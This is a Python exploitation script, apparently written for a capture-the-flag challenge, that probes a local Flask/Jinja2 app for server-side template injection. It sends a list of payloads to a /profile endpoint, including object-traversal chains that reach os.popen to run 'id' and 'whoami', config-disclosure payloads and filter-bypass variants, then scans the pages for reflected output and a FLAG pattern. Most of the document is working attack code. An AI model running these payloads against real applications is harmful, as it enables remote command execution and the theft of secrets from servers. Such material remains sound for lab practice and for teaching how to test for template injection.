import requests
import re
import time

# Base URL
base_url = "http://127.0.0.1"

# Session cookie from context
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVqJUw.pCSHMFD0BgCHgRCWKTrMsMcqWZE"

# Standard headers with session cookie
headers = {
    "Cookie": f"session={session_cookie}",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Test payloads categorized by type - using shorter payloads to avoid length filtering
payloads = {
    # Arithmetic operations - basic tests
    "arithmetic_simple": "{{7*7}}",
    "arithmetic_var": "{{2+3}}",
    
    # String operations
    "string_slice": '{{"abc"[0]}}',
    "string_len": '{{"test".__len__()}}',
    
    # Object traversal basics (shorter versions)
    "class_simple": "{{''.__class__}}",
    "mro_simple": "{{''.__class__.__mro__}}",
    
    # Config/globals access (common in Flask/Jinja2)
    "config": "{{config}}",
    "config_keys": "{{config.keys()}}",
    
    # OS command execution variants
    "os_popen": "{{config.__class__.__init__.__globals__.os.popen.id.read}}",
    "popen_short": '{{config.__init__.globals.os.popen("id").read}}',
    
    # Blind detection - length/execution indicators
    "cmd_len": '{{config.__class__.__init__.__globals__.os.popen("id").read.__len__}}',
    "whoami_len": '{{config.__class__.__init__.__globals__.os.popen("whoami").read.__len__}}',
    
    # Template engine errors - try to trigger error messages
    "error_trigger": "{{undefined_var}}",
    "syntax_error": "{{[}}",
    "attr_error": "{{'a'.nonexistent}}",
    
    # Alternative syntax variations
    "percent_syntax": "{% set x = 7*7 %}{{x}}",
    "comment_syntax": "{# comment #}{{7*7}}",
    
    # Filter bypass attempts - encoding
    "url_encoded": "%7B%7B7*7%7D%7D",
    "attr_via_filter": "{{''|attr('__class__')}}",
}

results = []

for name, payload in payloads.items():
    print(f"\n{'='*60}")
    print(f"[TEST] {name}")
    print(f"[PAYLOAD] {payload}")
    
    try:
        # POST to /profile
        profile_url = f"{base_url}/profile"
        post_data = {"data": payload}
        
        # Send POST request
        post_response = requests.post(profile_url, headers=headers, data=post_data, allow_redirects=True)
        print(f"[POST Status] {post_response.status_code}")
        print(f"[POST Response] {len(post_response.text)}B")
        
        if "payload" in post_response.text.lower() and "not allowed" in post_response.text.lower():
            print(f"[!] FILTER TRIGGERED: Payload blocked")
            results.append({
                "payload_name": name,
                "payload": payload,
                "post_status": post_response.status_code,
                "blocked": True,
                "profile_reflection": None,
                "home_reflection": None
            })
            continue
        
        # Wait a moment for any processing
        time.sleep(0.5)
        
        # Check /profile page for reflection
        profile_check = requests.get(profile_url, headers=headers)
        profile_content = profile_check.text
        print(f"[Profile Check] Status: {profile_check.status_code}, Size: {len(profile_content)}B")
        
        # Check for output reflection
        profile_reflection = False
        profile_match = None
        
        # Check for arithmetic results
        if "49" in payload and "49" in profile_content:
            profile_reflection = True
            profile_match = "49"
            print(f"[!] ARITHMETIC RESULT REFLECTED: Found '49'")
        elif "5" in payload and re.search(r'\b5\b', profile_content):
            profile_reflection = True
            profile_match = "5"
            print(f"[!] ARITHMETIC RESULT REFLECTED: Found '5'")
        
        # Check for string operation results
        if '"abc"[0]' in payload and "a" in profile_content:
            profile_reflection = True
            profile_match = "a"
            print(f"[!] STRING RESULT REFLECTED: Found 'a'")
        elif '"test"' in payload and "4" in profile_content:
            profile_reflection = True
            profile_match = "4"
            print(f"[!] STRING LENGTH REFLECTED: Found '4'")
        
        # Check for class/mro output
        if "__class__" in payload and ("str" in profile_content or "class" in profile_content):
            profile_reflection = True
            profile_match = "str/class"
            print(f"[!] OBJECT TRAVERSAL REFLECTED")
        
        # Check for config output
        if "config" in payload and ("Config" in profile_content or "config" in payload.lower() in profile_content.lower()):
            profile_reflection = True
            profile_match = "config"
            print(f"[!] CONFIG ACCESS REFLECTED")
        
        # Check for error messages
        error_indicators = ["template", "error", "exception", "jinja", "undefined", "syntax"]
        if any(error in profile_content.lower() for error in error_indicators):
            profile_reflection = True
            profile_match = "error_message"
            print(f"[!] ERROR MESSAGE DETECTED: template error indicators found")
        
        if not profile_reflection:
            print(f"[INFO] No obvious reflection or errors on /profile")
        
        # Check /home page for reflection
        home_url = f"{base_url}/home"
        home_check = requests.get(home_url, headers=headers)
        home_content = home_check.text
        print(f"[Home Check] Status: {home_check.status_code}, Size: {len(home_content)}B")
        
        home_reflection = False
        home_match = None
        
        # Same checks for /home
        if "49" in payload and "49" in home_content:
            home_reflection = True
            home_match = "49"
            print(f"[!] ARITHMETIC RESULT ON HOME: Found '49'")
        elif "5" in payload and re.search(r'\b5\b', home_content):
            home_reflection = True
            home_match = "5"
            print(f"[!] ARITHMETIC RESULT ON HOME: Found '5'")
        
        if '"abc"[0]' in payload and "a" in home_content:
            home_reflection = True
            home_match = "a"
            print(f"[!] STRING RESULT ON HOME: Found 'a'")
        elif '"test"' in payload and "4" in home_content:
            home_reflection = True
            home_match = "4"
            print(f"[!] STRING LENGTH ON HOME: Found '4'")
        
        if "__class__" in payload and ("str" in home_content or "class" in home_content):
            home_reflection = True
            home_match = "str/class"
            print(f"[!] OBJECT TRAVERSAL ON HOME")
        
        if "config" in payload and ("Config" in home_content or "config" in payload.lower() in home_content.lower()):
            home_reflection = True
            home_match = "config"
            print(f"[!] CONFIG ACCESS ON HOME")
        
        if any(error in home_content.lower() for error in error_indicators):
            home_reflection = True
            home_match = "error_message"
            print(f"[!] ERROR MESSAGE ON HOME: template error indicators found")
        
        if not home_reflection:
            print(f"[INFO] No obvious reflection or errors on /home")
        
        # Store results
        results.append({
            "payload_name": name,
            "payload": payload,
            "post_status": post_response.status_code,
            "blocked": False,
            "profile_reflection": profile_reflection,
            "profile_match": profile_match,
            "home_reflection": home_reflection,
            "home_match": home_match
        })
        
        # Look for specific content that might indicate blind SSTI
        profile_anomalies = []
        home_anomalies = []
        
        # Check for content length differences (blind indicator)
        if len(profile_content) > 1000:  # Arbitrary threshold
            profile_anomalies.append(f"large_content_{len(profile_content)}")
        
        if len(home_content) > 1000:
            home_anomalies.append(f"large_content_{len(home_content)}")
        
        # Check for timing differences (basic check)
        if post_response.elapsed.total_seconds() > 1.0:
            profile_anomalies.append("slow_response")
        
        if profile_anomalies:
            print(f"[ANOMALY] Profile: {profile_anomalies}")
        if home_anomalies:
            print(f"[ANOMALY] Home: {home_anomalies}")
        
    except Exception as e:
        print(f"[!] ERROR: {type(e).__name__}: {str(e)}")
        results.append({
            "payload_name": name,
            "payload": payload,
            "error": str(e),
            "post_status": None
        })
    
    # Small delay between tests
    time.sleep(0.2)

# Summary
print(f"\n{'='*60}")
print(f"[SUMMARY] Tested {len(results)} payloads")
print("\n[DIRECT OUTPUT DETECTED]:")

found_reflections = False
for r in results:
    if r.get("profile_reflection") or r.get("home_reflection"):
        found_reflections = True
        print(f"  - {r['payload_name']}: Profile={r.get('profile_reflection')} ({r.get('profile_match')}), Home={r.get('home_reflection')} ({r.get('home_match')})")

if not found_reflections:
    print("  None - likely blind SSTI")

print("\n[BLOCKED BY FILTER]:")
blocked = [r for r in results if r.get("blocked")]
for r in blocked:
    print(f"  - {r['payload_name']}: {r['payload']}")

print("\n[ANOMALIES/OBSERVATIONS]:")
for r in results:
    if not r.get("blocked") and not r.get("profile_reflection") and not r.get("home_reflection"):
        if r.get("post_status") in [200, 302]:
            print(f"  - {r['payload_name']}: Accepted but no output (potential blind indicator)")

# Check if any flag patterns appeared
all_responses = []
for r in results:
    if not r.get("blocked"):
        all_responses.append(str(r))

combined = " ".join(all_responses)
flag_match = re.search(r'FLAG\{[^}]+\}', combined)
if flag_match:
    print(f"\n[!] FLAG FOUND: {flag_match.group()}")
else:
    print(f"\n[FLAG] No FLAG pattern found in responses")

